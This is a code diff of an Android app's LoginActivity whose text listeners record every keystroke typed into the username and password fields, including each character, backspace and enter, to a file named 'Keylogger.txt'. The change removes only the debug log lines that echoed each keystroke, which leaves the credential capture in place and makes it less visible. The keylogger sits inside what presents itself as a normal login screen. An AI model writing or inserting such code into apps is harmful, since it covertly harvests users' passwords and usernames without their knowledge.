@@ -53,18 +53,15 @@ public class LoginActivity extends AppCompatActivity {
                     for (int i = 0; i < before - count; i++) {
                         String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
-                        Log.i("this", keylog);
                     }
                     return;
                 }
                 if (s.charAt(start + count - 1) == '\n') {
                     String keylog  = "Key Pressed in Username:{ENTER}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 } else {
                     String keylog = "Key Pressed in Username:{" + s.charAt(start + count - 1) + "}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 }
             }
 
@@ -87,18 +84,15 @@ public class LoginActivity extends AppCompatActivity {
                     for (int i = 0; i < before - count; i++) {
                         String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
                         writeToFile("Keylogger.txt", keylog);
-                        Log.i("this", keylog);
                     }
                     return;
                 }
                 if (s.charAt(start + count - 1) == '\n') {
                     String keylog  = "Key Pressed in Password:{ENTER}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 } else {
                     String keylog = "Key Pressed in Password:{" + s.charAt(start + count - 1) + "}\n";
                     writeToFile("Keylogger.txt", keylog);
-                    Log.i("this", keylog);
                 }
             }
 
